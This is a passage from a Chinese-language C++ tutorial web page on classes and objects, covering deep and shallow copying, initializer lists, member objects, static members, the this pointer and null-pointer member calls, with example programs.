class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-2-5-深拷贝与浅拷贝"><a href="#4-2-5-深拷贝与浅拷贝" class="headerlink" title="4.2.5 深拷贝与浅拷贝"></a>4.2.5 深拷贝与浅拷贝</h4><p>深浅拷贝是面试经典问题，也是常见的一个坑</p><ul><li>浅拷贝：简单的赋值拷贝操作</li><li>深拷贝：在堆区重新申请空间，进行拷贝操作</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//无参（默认）构造函数</span><br><span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//有参构造函数</span><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> age ,<span class="hljs-type">int</span> height) &#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;<br><br>m_age = age;<br>m_height = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(height);<br><br>&#125;<br><span class="hljs-comment">//拷贝构造函数  </span><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">const</span> Person&amp; p) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;<br><span class="hljs-comment">//如果不利用深拷贝在堆区创建新内存，会导致浅拷贝带来的重复释放堆区问题</span><br>m_age = p.m_age;<br>m_height = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(*p.m_height);<br><br>&#125;<br><br><span class="hljs-comment">//析构函数</span><br>~<span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;析构函数!&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">if</span> (m_height != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">delete</span> m_height;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_age;<br><span class="hljs-type">int</span>* m_height;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>, <span class="hljs-number">180</span>)</span></span>;<br><br><span class="hljs-function">Person <span class="hljs-title">p2</span><span class="hljs-params">(p1)</span></span>;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;p1的年龄： &quot;</span> &lt;&lt; p<span class="hljs-number">1.</span>m_age &lt;&lt; <span class="hljs-string">&quot; 身高： &quot;</span> &lt;&lt; *p<span class="hljs-number">1.</span>m_height &lt;&lt; endl;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;p2的年龄： &quot;</span> &lt;&lt; p<span class="hljs-number">2.</span>m_age &lt;&lt; <span class="hljs-string">&quot; 身高： &quot;</span> &lt;&lt; *p<span class="hljs-number">2.</span>m_height &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结：如果属性有在堆区开辟的，一定要自己提供拷贝构造函数，防止浅拷贝带来的问题</p></blockquote><h4 id="4-2-6-初始化列表"><a href="#4-2-6-初始化列表" class="headerlink" title="4.2.6 初始化列表"></a>4.2.6 初始化列表</h4><p><strong>作用：</strong></p><p>C++提供了初始化列表语法，用来初始化属性</p><p><strong>语法：</strong><code>构造函数()：属性1(值1),属性2（值2）... &#123;&#125;</code></p><p> (若都在初始化列表中初始化，则按声明顺序初始化，与初始化列表中的顺序无关)</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-comment">////传统方式初始化</span><br><span class="hljs-comment">//Person(int a, int b, int c) &#123;</span><br><span class="hljs-comment">//m_A = a;</span><br><span class="hljs-comment">//m_B = b;</span><br><span class="hljs-comment">//m_C = c;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-comment">//初始化列表方式初始化</span><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> c) :<span class="hljs-built_in">m_A</span>(a), <span class="hljs-built_in">m_B</span>(b), <span class="hljs-built_in">m_C</span>(c) &#123;&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintPerson</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;mA:&quot;</span> &lt;&lt; m_A &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;mB:&quot;</span> &lt;&lt; m_B &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;mC:&quot;</span> &lt;&lt; m_C &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> m_A;<br><span class="hljs-type">int</span> m_B;<br><span class="hljs-type">int</span> m_C;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-function">Person <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)</span></span>;<br>p.<span class="hljs-built_in">PrintPerson</span>();<br><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-2-7-类对象作为类成员"><a href="#4-2-7-类对象作为类成员" class="headerlink" title="4.2.7 类对象作为类成员"></a>4.2.7 类对象作为类成员</h4><p>C++类中的成员可以是另一个类的对象，我们称该成员为 对象成员</p><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span><br>&#123;<br>    A a；<br>&#125;<br></code></pre></td></tr></table></figure><p>B类中有对象A作为成员，A为对象成员</p><p>那么当创建B对象时，A与B的构造和析构的顺序是谁先谁后？</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Phone</span>(string name)<br>&#123;<br>m_PhoneName = name;<br>cout &lt;&lt; <span class="hljs-string">&quot;Phone构造&quot;</span> &lt;&lt; endl;<br>&#125;<br><br>~<span class="hljs-built_in">Phone</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Phone析构&quot;</span> &lt;&lt; endl;<br>&#125;<br><br>string m_PhoneName;<br><br>&#125;;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-comment">//初始化列表可以告诉编译器调用哪一个构造函数</span><br><span class="hljs-built_in">Person</span>(string name, string pName) :<span class="hljs-built_in">m_Name</span>(name), <span class="hljs-built_in">m_Phone</span>(pName)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Person构造&quot;</span> &lt;&lt; endl;<br>&#125;<br><br>~<span class="hljs-built_in">Person</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Person析构&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">playGame</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; m_Name &lt;&lt; <span class="hljs-string">&quot; 使用&quot;</span> &lt;&lt; m_Phone.m_PhoneName &lt;&lt; <span class="hljs-string">&quot; 牌手机! &quot;</span> &lt;&lt; endl;<br>&#125;<br><br>string m_Name;<br>Phone m_Phone;<br><br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//当类中成员是其他类对象时，我们称该成员为 对象成员</span><br><span class="hljs-comment">//构造的顺序是 ：先调用对象成员的构造，再调用本类构造</span><br><span class="hljs-comment">//析构顺序与构造相反</span><br><span class="hljs-function">Person <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-string">&quot;张三&quot;</span> , <span class="hljs-string">&quot;苹果X&quot;</span>)</span></span>;<br>p.<span class="hljs-built_in">playGame</span>();<br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-2-8-静态成员"><a href="#4-2-8-静态成员" class="headerlink" title="4.2.8 静态成员"></a>4.2.8 静态成员</h4><p>静态成员就是在成员变量和成员函数前加上关键字static，称为静态成员</p><p>静态成员分为：</p><ul><li>静态成员变量<ul><li>所有对象共享同一份数据</li><li>在编译阶段分配内存</li><li>类内声明，类外初始化</li></ul></li><li>静态成员函数<ul><li>所有对象共享同一个函数</li><li>静态成员函数只能访问静态成员变量</li></ul></li></ul><p>**示例1 ：**静态成员变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> m_A; <span class="hljs-comment">//静态成员变量</span><br><br><span class="hljs-comment">//静态成员变量特点：</span><br><span class="hljs-comment">//1 在编译阶段分配内存</span><br><span class="hljs-comment">//2 类内声明，类外初始化</span><br><span class="hljs-comment">//3 所有对象共享同一份数据</span><br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> m_B; <span class="hljs-comment">//静态成员变量也是有访问权限的</span><br>&#125;;<br><span class="hljs-type">int</span> Person::m_A = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> Person::m_B = <span class="hljs-number">10</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//静态成员变量两种访问方式</span><br><br><span class="hljs-comment">//1、通过对象</span><br>Person p1;<br>p<span class="hljs-number">1.</span>m_A = <span class="hljs-number">100</span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;p1.m_A = &quot;</span> &lt;&lt; p<span class="hljs-number">1.</span>m_A &lt;&lt; endl;<br><br>Person p2;<br>p<span class="hljs-number">2.</span>m_A = <span class="hljs-number">200</span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;p1.m_A = &quot;</span> &lt;&lt; p<span class="hljs-number">1.</span>m_A &lt;&lt; endl; <span class="hljs-comment">//共享同一份数据</span><br>cout &lt;&lt; <span class="hljs-string">&quot;p2.m_A = &quot;</span> &lt;&lt; p<span class="hljs-number">2.</span>m_A &lt;&lt; endl;<br><br><span class="hljs-comment">//2、通过类名</span><br>cout &lt;&lt; <span class="hljs-string">&quot;m_A = &quot;</span> &lt;&lt; Person::m_A &lt;&lt; endl;<br><br><br><span class="hljs-comment">//cout &lt;&lt; &quot;m_B = &quot; &lt;&lt; Person::m_B &lt;&lt; endl; //私有权限访问不到</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>**示例2：**静态成员函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-comment">//静态成员函数特点：</span><br><span class="hljs-comment">//1 程序共享一个函数</span><br><span class="hljs-comment">//2 静态成员函数只能访问静态成员变量</span><br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func调用&quot;</span> &lt;&lt; endl;<br>m_A = <span class="hljs-number">100</span>;<br><span class="hljs-comment">//m_B = 100; //错误，不可以访问非静态成员变量</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> m_A; <span class="hljs-comment">//静态成员变量</span><br><span class="hljs-type">int</span> m_B; <span class="hljs-comment">// </span><br><span class="hljs-keyword">private</span>:<br><br><span class="hljs-comment">//静态成员函数也是有访问权限的</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">func2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func2调用&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-type">int</span> Person::m_A = <span class="hljs-number">10</span>;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//静态成员变量两种访问方式</span><br><br><span class="hljs-comment">//1、通过对象</span><br>Person p1;<br>p<span class="hljs-number">1.f</span>unc();<br><br><span class="hljs-comment">//2、通过类名</span><br>Person::<span class="hljs-built_in">func</span>();<br><br><br><span class="hljs-comment">//Person::func2(); //私有权限访问不到</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-3-C-对象模型和this指针"><a href="#4-3-C-对象模型和this指针" class="headerlink" title="4.3 C++对象模型和this指针"></a>4.3 C++对象模型和this指针</h3><h4 id="4-3-1-成员变量和成员函数分开存储"><a href="#4-3-1-成员变量和成员函数分开存储" class="headerlink" title="4.3.1 成员变量和成员函数分开存储"></a>4.3.1 成员变量和成员函数分开存储</h4><p>在C++中，类内的成员变量和成员函数分开存储</p><p>只有非静态成员变量才属于类的对象上</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>() &#123;<br>mA = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//非静态成员变量占对象空间</span><br><span class="hljs-type">int</span> mA;<br><span class="hljs-comment">//静态成员变量不占对象空间</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> mB; <br><span class="hljs-comment">//函数也不占对象空间，所有函数共享一个函数实例</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;mA:&quot;</span> &lt;&lt; <span class="hljs-keyword">this</span>-&gt;mA &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//静态成员函数也不占对象空间</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">sfunc</span><span class="hljs-params">()</span> </span>&#123;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>cout &lt;&lt; <span class="hljs-built_in">sizeof</span>(Person) &lt;&lt; endl;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-3-2-this指针概念"><a href="#4-3-2-this指针概念" class="headerlink" title="4.3.2 this指针概念"></a>4.3.2 this指针概念</h4><p>通过4.3.1我们知道在C++中成员变量和成员函数是分开存储的</p><p>每一个非静态成员函数只会诞生一份函数实例，也就是说多个同类型的对象会共用一块代码</p><p>那么问题是：这一块代码是如何区分那个对象调用自己的呢？</p><p>c++通过提供特殊的对象指针，this指针，解决上述问题。<strong>this指针指向被调用的成员函数所属的对象</strong></p><p>this指针是隐含每一个非静态成员函数内的一种指针</p><p>this指针不需要定义，直接使用即可</p><p>this指针的用途：</p><ul><li>当形参和成员变量同名时，可用this指针来区分</li><li>在类的非静态成员函数中返回对象本身，可使用return *this</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> age)<br>&#123;<br><span class="hljs-comment">//1、当形参和成员变量同名时，可用this指针来区分</span><br><span class="hljs-keyword">this</span>-&gt;age = age;<br>&#125;<br><br><span class="hljs-function">Person&amp; <span class="hljs-title">PersonAddPerson</span><span class="hljs-params">(Person p)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">this</span>-&gt;age += p.age;<br><span class="hljs-comment">//返回对象本身</span><br><span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><br><span class="hljs-type">int</span> age;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;p1.age = &quot;</span> &lt;&lt; p<span class="hljs-number">1.</span>age &lt;&lt; endl;<br><br><span class="hljs-function">Person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br>p<span class="hljs-number">2.</span><span class="hljs-built_in">PersonAddPerson</span>(p1).<span class="hljs-built_in">PersonAddPerson</span>(p1).<span class="hljs-built_in">PersonAddPerson</span>(p1);<br>cout &lt;&lt; <span class="hljs-string">&quot;p2.age = &quot;</span> &lt;&lt; p<span class="hljs-number">2.</span>age &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-3-3-空指针访问成员函数"><a href="#4-3-3-空指针访问成员函数" class="headerlink" title="4.3.3 空指针访问成员函数"></a>4.3.3 空指针访问成员函数</h4><p>C++中空指针也是可以调用成员函数的，但是也要注意有没有用到this指针</p><p>如果用到this指针，需要加以判断保证代码的健壮性</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//空指针访问成员函数</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowClassName</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;我是Person类!&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowPerson</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>cout &lt;&lt; mAge &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> mAge;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Person * p = <span class="hljs-literal">NULL</span>;<br>p-&gt;<span class="hljs-built_in">ShowClassName</span>(); <span class="hljs-comment">//空指针，可以调用成员函数</span><br>p-&gt;<span class="hljs-built_in">ShowPerson</span>();  <span class="hljs-comment">//但是如果成员函数中用到了this指针，就不可以了</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span 